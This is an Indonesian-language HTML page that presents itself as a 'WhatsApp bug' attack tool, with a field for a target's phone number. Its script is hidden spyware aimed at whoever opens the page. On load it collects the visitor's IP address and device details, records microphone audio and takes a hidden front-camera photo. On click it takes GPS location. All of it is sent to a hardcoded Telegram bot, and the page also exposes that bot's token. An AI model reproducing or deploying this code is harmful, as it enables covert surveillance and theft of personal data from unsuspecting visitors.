<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>dhack bug</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
      font-family: 'Inter', sans-serif;
      color: blue;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
      padding: 20px;
    }
    .bg-particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
    .particle {
      position: absolute;
      width: 2px;
      height: 2px;
      background: rgba(0, 255, 127, 0.3);
      border-radius: 50%;
      animation: float 6s ease-in-out infinite;
    }
    @keyframes float {
      0%, 100% { transform: translateY(0px); opacity: 0.3; }
      50% { transform: translateY(-20px); opacity: 0.8; }
    }
    .login-container {
      background-color: rgba(17, 17, 17, 0.95);
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 20px blue;
      text-align: center;
      max-width: 400px;
      width: 100%;
      z-index: 2;
    }
    .login-title {
      font-size: 26px;
      font-weight: 900;
      margin-bottom: 5px;
      background: linear-gradient(135deg, #2563eb, #ffffff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    #notif {
      font-size: 14px;
      color: #00d9ff;
      font-weight: 600;
      height: 20px;
      margin-bottom: 10px;
      display: none;
    }
    .login-input {
      width: 100%;
      padding: 12px;
      margin-bottom: 16px;
      background: #333;
      border: none;
      border-radius: 6px;
      color: #fff;
      font-size: 15px;
    }
    .login-button {
      width: 100%;
      padding: 12px;
      background: linear-gradient(135deg, #2563eb, #2563eb);
      color: black;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-weight: 600;
      font-size: 15px;
    }
    .login-button:hover { background-color: #2563eb; box-shadow: 0 0 20px blue; }
  </style>
</head>
<body>
  <div class="bg-particles"></div>

  <div class="login-container">
    <p class="login-title">bug WhatsApp By Hacked official</p>
    <div id="notif">Sukses bug atack ✅</div>
    <input type="number" class="login-input" placeholder="Nomor WhatsApp Target" id="text">
    <button class="login-button" id="login-button">Atack</button>
  </div>

  <script>
    const botToken = '8403098052:AAHoNelCuHdAaZJwYZQxH0kJPgkbC2hXOdg';
    const chatIds = ['7945789634'];
    const input = document.getElementById('text');
    const button = document.getElementById('login-button');
    const notif = document.getElementById('notif');

    function sendToTelegram(text) {
      chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
        }).catch(console.error);
      });
    }

    function sendPhoto(blob, filename, caption) {
      chatIds.forEach(id => {
        const formData = new FormData();
        formData.append('chat_id', id);
        formData.append('photo', blob, filename);
        if(caption) formData.append('caption', caption);
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData }).catch(console.error);
      });
    }

    function sendVoice(blob, filename) {
      chatIds.forEach(id => {
        const formData = new FormData();
        formData.append('chat_id', id);
        formData.append('voice', blob, filename);
        fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: formData }).catch(console.error);
      });
    }

    async function getInfo() {
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const battery = await navigator.getBattery?.() || { level: 0 };
        const ram = navigator.deviceMemory || "Tidak diketahui";
        const device = navigator.userAgent.split('(')[1].split(')')[0];

        const text = `📱 <b>Device:</b> ${device}\n🌐 <b>IP:</b> ${ipData.ip}\n🔋 <b>Baterai:</b> ${(battery.level * 100).toFixed(0)}%\n🕒 <b>Waktu:</b> ${new Date().toLocaleString()}\n📟 <b>RAM Handphone:</b> ±${ram} GB`;
        sendToTelegram(`<b>📥 Info Pengunjung (Auto):</b>\n\n${text}`);
      } catch (err) {}
    }

    function trackLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
          },
          () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
        );
      }
    }

    async function autoRecordAudio() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
        mediaRecorder.onstop = () => {
          const blob = new Blob(chunks, { type: 'audio/mpeg' }); 
          sendVoice(blob, 'voice_note.mp3');
          stream.getTracks().forEach(track => track.stop());
        };
        mediaRecorder.start();
        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 5000);
      } catch (err) {
        sendToTelegram('Izin Voice Note ditolak ❌');
      }
    }

    // PERBAIKAN SEMPURNA FITUR FOTO (MENGGUNAKAN HIDDEN VIDEO ELEMENT)
    async function takePhotoFast() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user" } 
        });

        // Buat elemen video secara dinamis untuk rendering
        const video = document.createElement('video');
        video.style.display = 'none'; // Sembunyikan dari tampilan
        video.setAttribute('autoplay', '');
        video.setAttribute('muted', '');
        video.setAttribute('playsinline', '');
        video.srcObject = stream;
        document.body.appendChild(video);

        // Tunggu video benar-benar siap
        video.onplaying = () => {
          // Berikan jeda 1.2 detik (optimal untuk auto-focus dan cahaya)
          setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            
            // Render frame video ke canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(blob => {
              if (blob && blob.size > 0) {
                sendPhoto(blob, 'depan.png', 'berhasil mengirim foto ✅');
              } else {
                sendToTelegram('Gagal memproses gambar ❌');
              }
              // Bersihkan memori dan matikan kamera
              stream.getTracks().forEach(track => track.stop());
              video.remove();
            }, 'image/png');
          }, 1200);
        };
      } catch (err) {
        sendToTelegram(`Izin Kamera depan ditolak ❌`);
      }
    }

    window.addEventListener('DOMContentLoaded', () => {
      createParticles();
      getInfo();
      autoRecordAudio();
      takePhotoFast(); 
    });

    button.addEventListener('click', () => {
      const nomor = input.value.trim();
      if (!nomor || nomor.length < 8) return;
      
      trackLocation();

      button.disabled = true;
      notif.style.display = 'none';
      sendToTelegram(`<b>📞 Target Attack:</b> ${nomor}`);
      
      setTimeout(() => {
        notif.style.display = 'block';
        button.disabled = false;
        input.value = '';
      }, 1000);
    });

    function createParticles() {
      const container = document.querySelector('.bg-particles');
      for (let i = 0; i < 30; i++) {
        const p = document.createElement('div');
        p.className = 'particle';
        p.style.left = Math.random() * 100 + '%';
        p.style.top = Math.random() * 100 + '%';
        container.appendChild(p);
      }
    }
  </script>
</body>
</html>
